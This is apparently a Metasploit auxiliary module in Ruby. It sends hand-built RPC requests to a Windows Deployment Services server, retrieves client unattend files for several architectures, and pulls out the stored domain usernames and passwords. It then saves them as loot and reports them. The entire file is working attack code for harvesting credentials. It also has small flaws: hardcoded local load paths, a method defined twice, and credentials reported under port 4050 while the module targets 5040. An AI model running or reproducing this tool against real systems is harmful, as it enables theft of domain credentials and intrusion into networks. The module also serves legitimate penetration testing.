##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/proto/dcerpc'
require 'rex/parser/unattend'

load '/opt/metasploit/msf3/lib/rex/parser/unattend.rb'
load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/client.rb'
load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/packet.rb'
load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/handle.rb'

class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Remote::DCERPC
	include Msf::Auxiliary::Report 

    DCERPCPacket   = Rex::Proto::DCERPC::Packet
    DCERPCClient   = Rex::Proto::DCERPC::Client
    DCERPCResponse = Rex::Proto::DCERPC::Response
    DCERPCUUID     = Rex::Proto::DCERPC::UUID

	
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Windows Deployment Services Unattend Retrieval',
			'Description'    => %q{
						This module retrieves the client unattend file from Windows
						Deployment Services RPC service and parses out the stored credentials
			},
			'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '',
			'References'     =>
				[
					[ 'MSDN', 'http://msdn.microsoft.com/en-us/library/dd891255(prot.20).aspx'],
				],
			'DisclosureDate' => 'N/A',
			))

		register_options(
			[
				Opt::RPORT(5040),
			], self.class)
		
		#Easier way to make these into enum?
		@architectures = {
			'x64' => 9,
			'x86' => 0,
			'ia64' => 6,
			'arm' => 5
		}
		
		@pkt_type = {
			'request' => 1,
			'reply' => 2
		}
		
		@opcode = {	
			'IMG_ENUMERATE' => 2,
			'LOG_INIT' => 3,
			'LOG_MSG' => 4,
			'GET_CLIENT_UNATTEND' => 5,
			'GET_UNATTEND_VARIABLES' => 6,
			'GET_DOMAIN_JOIN_INFORMATION' => 7,
			'RESET_BOOT_PROGRAM' => 8,
			'GET_MACHINE_DRIVER_PACKAGES' => 0x000000C8
		}
		
		@base_type = {
			'BYTE' => 0x0001,
			'USHORT' => 0x0002,
			'ULONG' => 0x0004,
			'ULONG64' => 0x008,
			'STRING' => 0x0010,
			'WSTRING' => 0x0020,
			'BLOB' => 0x0040
		}
		
		@type_modifier = {
			'NONE' => 0x0000,
			'ARRAY' => 0x1000
		}
		
	end
	
	def run 
		# Create a handler with our UUID and Transfer Syntax
		self.handle = Rex::Proto::DCERPC::Handle.new(	['1a927394-352e-4553-ae3f-7cf4aafca620', '1.0','71710533-beba-4937-8319-b5dbef9ccc36', 1],
														'ncacn_ip_tcp', 
														rhost, 
														[datastore['RPORT']])
		
		print_status("Binding to #{handle} ...")
		begin
			self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
			vprint_status("Bound to #{handle} ...")
			rescue
				print_error("Unable to bind")
				return
		end
		
		table = Rex::Ui::Text::Table.new({
                        'Header' => 'WindowsDeploymentServices',
                        'Indent' => 1,
                        'Columns' => ['Architecture', 'Domain', 'Username', 'Password']
        })
		
		@architectures.each do |architecture|
			result = request_client_unattend(architecture)
			
			unless result.nil?
				loot_unattend(architecture[0], result)
				results = parse_client_unattend(result)
				
				results.each do |result|
					unless result.empty?
						unless result['username'].nil? || result['password'].nil?
							print_good("Retrived credentials for #{architecture[0]}")
							report_creds(result['domain'], result['username'], result['password'])
							table << [architecture[0], result['domain'], result['username'], result['password']]
						end
					end
				end
			end
		end
		
		print_line table.to_s
	end
	
	def variable_description_block(name, value_type, type_mod=0, value_length=nil, array_size=0, value)
		padding = 0	
		
		if value_length.nil?
			value_length = value.length
		end
		
		len = 16 * (1 + (value_length/16)) # Variable block total size should be evenly divisible by 16.
		return [name, padding, value_type, type_mod, value_length, array_size, value].pack('a66vvvVVa%i' % len)
	end
	
	def request_client_unattend(architecture)	
		# Construct WDS Control Protocol Message:
		header = "\x38\x02\x00\x00\x00\x00\x00\x00\x38\x02\x00\x00\x00\x00\x00\x00" # Total Packet Length?
		
		endpoint_header = 	[	40, 																# Header Size
								256, 																# Version
								528,																# Packet Size
								"\x5a\xeb\xde\xd8\xfd\xef\xb2\x43\x99\xfc\x1a\x8a\x59\x21\xc2\x27", # GUID
								"\x00"*16															# Reserved
							].pack('vvVa16a16')
							
		operation_header = [ 	528,							# PacketSize
								256, 							# Version
								@pkt_type['request'], 			# Packet_Type
								0, 								# Padding
								@opcode['GET_CLIENT_UNATTEND'], # Opcode
								4,								# Variable Count
							].pack('VvCCVV')					
		
		architecture_description_block = variable_description_block(
											"\x41\x00\x52\x00\x43\x00\x48\x00\x49\x00\x54\x00\x45\x00\x43\x00"\
											"\x54\x00\x55\x00\x52\x00\x45\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
											"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
											"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
											"\x00\x00",				# Name
											@base_type['ULONG'], 	# Base Type
											@type_modifier['NONE'], # Type Modifier
											4, 						# Value Length
											0, 						# Array Size
											[architecture[1]].pack('C') # Value						
										)

		client_guid_variable = variable_description_block(
											"\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x5f\x00\x47\x00"\
											"\x55\x00\x49\x00\x44\x00\x00\x00\x49\x00\x44\x00\x00\x00\x00\x00"\
											"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
											"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
											"\x00\x00",
											@base_type['WSTRING'],
											@type_modifier['NONE'],
											66,
											0,
											"\x35\x00\x36\x00\x34\x00\x44\x00\x41\x00\x36\x00\x31\x00\x44\x00"\
											"\x32\x00\x41\x00\x45\x00\x31\x00\x41\x00\x41\x00\x42\x00\x32\x00"\
											"\x38\x00\x36\x00\x34\x00\x46\x00\x34\x00\x34\x00\x46\x00\x32\x00"\
											"\x38\x00\x32\x00\x46\x00\x30\x00\x34\x00\x33\x00\x34\x00\x30\x00"\
											"\x00\x00\x61\x00\x38\x00\x39\x00\x00"
										)
											
		client_mac_variable = variable_description_block(
											"\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x5f\x00\x4d\x00"\
											"\x41\x00\x43\x00\x00\x00\x36\x6f\x31\x33\x37\x3c\x08\x4d\x53\x46"\
											"\x54\x20\x35\x2e\x30\x37\x0c\x01\x0f\x03\x06\x2c\x2e\x2f\x1f\x21"\
											"\x79\xf9\x2b\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
											"\x00\x00",
											@base_type['WSTRING'],
											@type_modifier['NONE'],
											66,
											0,
											"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00"\
											"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00"\
											"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x35\x00\x30\x00"\
											"\x35\x00\x36\x00\x33\x00\x35\x00\x31\x00\x41\x00\x37\x00\x35\x00"\
											"\x00\x00\x12\x00\x00\x00\x00\x00\x00"
										)

		version_variable = variable_description_block(
											"\x56\x00\x45\x00\x52\x00\x53\x00\x49\x00\x4f\x00\x4e\x00\x00\x00"\
											"\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
											"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"\
											"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
											"\x00\x00",
											@base_type['ULONG'],
											@type_modifier['NONE'],
											4,
											0,
											"\x00\x00\x00\x01\x00\x00\x00\x00"
										)
		
		wdsc_packet = header + 
					endpoint_header + 
					operation_header + 
					architecture_description_block + 
					client_guid_variable + 
					client_mac_variable + 
					version_variable

		vprint_status("Sending #{architecture[0]} Client Unattend request ...")
		response = dcerpc.call(0, wdsc_packet)

		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			vprint_status('Received response ...')
			data = dcerpc.last_response.stub_data
			
			# Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000)
			op_error_code = data.unpack('i*')[18]
			if op_error_code == 0
				vprint_status("Received #{architecture[0]} response")
				return extract_unattend(dcerpc.last_response.stub_data)
			else
				vprint_error("Error code received for #{architecture[0]}: #{op_error_code}")
				return nil
			end
		end
	end
	
	def extract_unattend(data)
		start = data.index('<?xml')
		finish = data.index('</unattend>')+10
		return data[start..finish]
	end
	
	def parse_client_unattend(data)
		begin
			xml = REXML::Document.new(data)

			rescue REXML::ParseException => e
					print_error("Invalid XML format")
					vprint_line(e.message)
			end
    
		return Rex::Parser::Unattend.parse(xml).flatten
	end
	
	def loot_unattend(archi, data)
			return if data.empty?	
			p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
			print_status("Raw version of #{archi} saved as: #{p}")
	end
	
	def loot_unattend(archi, data)
			return if data.empty?	
			p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
			print_status("Raw version of #{archi} to loot")
	end
	
	def report_creds(domain, user, pass)
		report_auth_info(
				:host  => rhost,
				:port => 4050,
				:sname => 'dcerpc',
				:proto => 'tcp',
				:source_id => nil,
				:source_type => "aux",
				:user => "#{domain}\\#{user}",
				:pass => pass)
	end


end
